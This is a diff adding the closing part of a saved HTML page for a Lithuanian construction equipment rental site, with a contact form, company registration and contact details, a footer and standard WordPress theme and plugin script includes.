+                                <div class="counter__number">
+                                                                        <span class="n counter">0</span>
+                                                                            <span class="n-a">%</span>
+                                                                    </div>
+                                <div class="counter_title">Nepatenkintų klientų</div>
+                            </div>
+                        </div>
+
+                                        </div>
+            </div>
+                            </section>
+                                <section id="team"                  class="section-team section-padding section-meta onepage-section">
+                                <div class="container">
+                                <div class="section-title-area">
+                    <h5 class="section-subtitle">mes jums padėsime</h5>                    <h2 class="section-title">Mūsų komanda</h2>                    <div class="section-desc"><p>Pas mus dirba patyrę ir savo darbą išmanantys žmonės, kurie padės ir pakonsultuos Jums rūpimais klausimais dėl užsakytų paslaugų.</p>
+</div>                </div>
+                                <div class="team-members row team-layout-4">
+                                    </div>
+            </div>
+                            </section>
+                                <section id="contact"                  class="section-contact section-padding  section-meta onepage-section">
+                                <div class="container">
+                                <div class="section-title-area">
+                    <h5 class="section-subtitle">susisiekite</h5>                    <h2 class="section-title">Rašykite mums</h2>                                    </div>
+                                <div class="row">
+                                                                        <div class="contact-form col-sm-6 wow slideInUp">
+                                <div role="form" class="wpcf7" id="wpcf7-f1227-o1" lang="en-US" dir="ltr">
+<div class="screen-reader-response"></div>
+<form action="#wpcf7-f1227-o1" method="post" class="wpcf7-form" novalidate="novalidate">
+<div style="display: none;">
+<input type="hidden" name="_wpcf7" value="1227" />
+<input type="hidden" name="_wpcf7_version" value="5.1.6" />
+<input type="hidden" name="_wpcf7_locale" value="en_US" />
+<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f1227-o1" />
+<input type="hidden" name="_wpcf7_container_post" value="0" />
+</div>
+<p>Jūsų vardas (būtina)<br />
+    <span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" /></span> </p>
+<p>Jūsų el. pašto adresas (būtina)<br />
+    <span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" aria-required="true" aria-invalid="false" /></span> </p>
+<p>Tema<br />
+    <span class="wpcf7-form-control-wrap your-subject"><input type="text" name="your-subject" value="" size="40" class="wpcf7-form-control wpcf7-text" aria-invalid="false" /></span> </p>
+<p>Jūsų žinutė<br />
+    <span class="wpcf7-form-control-wrap your-message"><textarea name="your-message" cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea" aria-invalid="false"></textarea></span> </p>
+<p><input type="submit" value="Siųsti" class="wpcf7-form-control wpcf7-submit" /></p>
+<p>[recaptcha]</p>
+<div class="wpcf7-response-output wpcf7-display-none"></div></form></div>                            </div>
+                                            
+                    <div class="col-sm-6 wow slideInUp">
+                        <br>
+                        <h4>Mūsų rekvizitai</h4>
+UAB „JARNEDA“
+Įmonės kodas 302661544
+PVM mokėtojo kodas: LT100006556417
+Adresas: Žirgų g. 19, Antežeriai, LT-14158 Vilniaus r.                        <br><br>
+
+                        <div class="address-box">
+
+                            <h3>Susisiekite</h3>
+
+                                                            <div class="address-contact">
+                                    <span class="fa-stack"><i class="fa fa-circle fa-stack-2x"></i><i class="fa fa-map-marker fa-stack-1x fa-inverse"></i></span>
+
+                                    <div class="address-content">Žirgų g. 19, Antežeriai, LT-14158 Vilniaus r.</div>
+                                </div>
+                            
+                                                            <div class="address-contact">
+                                    <span class="fa-stack"><i class="fa fa-circle fa-stack-2x"></i><i class="fa fa-phone fa-stack-1x fa-inverse"></i></span>
+
+                                    <div class="address-content">+370 648 39444 </div>
+                                </div>
+                            
+                                                            <div class="address-contact">
+                                    <span class="fa-stack"><i class="fa fa-circle fa-stack-2x"></i><i class="fa fa-envelope-o fa-stack-1x fa-inverse"></i></span>
+
+                                    <div class="address-content"><a href="mailto:in&#102;&#111;&#64;&#116;e&#99;hn&#105;k&#97;&#110;u&#111;ma&#105;.&#108;&#116;">i&#110;&#102;o&#64;t&#101;&#99;&#104;&#110;&#105;&#107;&#97;nu&#111;&#109;&#97;i&#46;&#108;t</a></div>
+                                </div>
+                            
+                                                    </div>
+                    </div>
+                </div>
+            </div>
+                            </section>
+            		</main><!-- #main -->
+	</div><!-- #content -->
+
+    <footer id="colophon" class="site-footer" role="contentinfo">
+                    <div class="footer-connect">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-sm-2"></div>
+                        
+                        <div class="col-sm-8">
+                                                            <div class="footer-social">
+                                    <h5 class="follow-heading">Sekite mūsų facebook'ą</h5><div class="footer-social-icons"><a target="_blank" href="https://www.facebook.com/statybutechnika" title="Facebook"><i class="fa fa-facebook"></i></a></div>                                </div>
+                                                    </div>
+                        <div class="col-sm-2"></div>
+                    </div>
+                </div>
+            </div>
+        
+        <div class="site-info">
+            <div class="container">
+                                    <div class="btt">
+                        <a class="back-top-top" href="#page" title="Back To Top"><i class="fa fa-angle-double-up wow flash" data-wow-duration="2s"></i></a>
+                    </div>
+                                        Copyright &copy; 2020 Statybų technika        <span class="sep"> &ndash; </span>
+        <a href="https://www.famethemes.com/themes/onepress">OnePress</a> theme by FameThemes                    </div>
+        </div>
+        <!-- .site-info -->
+
+    </footer><!-- #colophon -->
+</div><!-- #page -->
+
+<a href="tel:+37064839444 " id="callnowbutton" ><span class="NoButtonText">Call Now Button</span></a><script type='text/javascript'>
+/* <![CDATA[ */
+var wpcf7 = {"apiSettings":{"root":"https:\/\/technikanuomai.lt\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/plugins/contact-form-7/includes/js/scripts_ver=5.1.6.js'></script>
+<script type='text/javascript' src='wp-content/themes/onepress/assets/js/plugins_ver=1.0.0.js'></script>
+<script type='text/javascript' src='wp-content/themes/onepress/assets/js/bootstrap.min_ver=4.0.0.js'></script>
+<script type='text/javascript' src='wp-content/themes/onepress/assets/js/theme_ver=20120206.js'></script>
+<script type='text/javascript' src='wp-includes/js/wp-embed.min_ver=7bd3ea8097cdcb3dff311d783e7316fe.js'></script>
+
+</body>
+</html>
